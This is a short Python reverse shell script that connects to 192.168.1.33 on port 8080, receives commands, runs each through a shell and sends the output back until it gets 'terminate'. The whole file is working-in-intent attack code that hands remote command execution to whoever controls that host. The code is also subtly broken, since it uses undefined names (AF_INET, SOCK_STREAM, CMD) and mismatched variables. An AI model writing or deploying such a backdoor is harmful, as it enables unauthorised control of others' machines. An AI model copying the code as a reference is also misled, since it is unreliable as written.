#!/usr/bin/python

import socket
import subprocess


def connect():
	Tcpsocket = socket.socket(AF_INET,SOCK_STREAM)
	Tcpsocket.connect(("192.168.1.33",8080))
	while True:
		command = Tcpsocket.recv(1024)
		if "terminate" in command:
			Tcpsocket.close()
			break
		else:
			Prompt = subprocess.Popen(command,shell= True,stdout= subprocess.PIPE,stderr= subprocess.PIPE,stdin= subprocess.PIPE)
			Tcpsocket.sendall(CMD.stdout.read())
			Tcpsocket.sendall(CMD.stderr.read())
def main():
	connect()
main()
	
